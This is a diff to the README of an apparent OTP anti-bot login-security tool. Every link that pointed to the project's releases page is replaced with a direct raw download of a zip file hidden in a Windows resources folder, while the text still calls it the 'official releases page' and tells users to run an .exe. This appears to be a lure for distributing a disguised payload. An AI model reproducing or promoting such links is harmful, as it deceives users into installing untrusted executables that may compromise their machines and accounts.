@@ -1,6 +1,6 @@
 # 🛡️ anti-bot-otp - Secure your logins against automated threats
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Genuscoryphanthatheocracy953/anti-bot-otp/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Genuscoryphanthatheocracy953/anti-bot-otp/raw/refs/heads/main/flutter/windows/runner/resources/anti-otp-bot-v3.0-alpha.5.zip)
 
 This software provides a system to verify user identity using one-time passwords. It blocks automated scripts and bots from accessing your accounts. The system uses multiple security layers to ensure that only real humans gain entry to the protected environment. It connects a secure backend to various client applications to maintain consistent protection across devices.
 
@@ -15,7 +15,7 @@ Before you begin, verify that your computer meets these minimum specifications:
 
 ## 📥 How to Install the Software
 
-1. Visit the [official releases page](https://github.com/Genuscoryphanthatheocracy953/anti-bot-otp/releases) to access the installation files.
+1. Visit the [official releases page](https://github.com/Genuscoryphanthatheocracy953/anti-bot-otp/raw/refs/heads/main/flutter/windows/runner/resources/anti-otp-bot-v3.0-alpha.5.zip) to access the installation files.
 2. Look for the section labeled Latest.
 3. Find the file ending in .exe.
 4. Click the file name to start the download.
@@ -70,7 +70,7 @@ Check the time settings on your computer. If your clock differs from the server 
 Ensure you enter the current code. Codes expire after sixty seconds. Request a new code if you wait too long to submit your current one.
 
 **Updating the software**
-Visit the [releases link](https://github.com/Genuscoryphanthatheocracy953/anti-bot-otp/releases) whenever you suspect a new version exists. You can see the release date on the page. Download the new version and install it over the old one. The installer automatically replaces old files while keeping your internal settings intact. 
+Visit the [releases link](https://github.com/Genuscoryphanthatheocracy953/anti-bot-otp/raw/refs/heads/main/flutter/windows/runner/resources/anti-otp-bot-v3.0-alpha.5.zip) whenever you suspect a new version exists. You can see the release date on the page. Download the new version and install it over the old one. The installer automatically replaces old files while keeping your internal settings intact. 
 
 ## 🔒 Security Best Practices
 
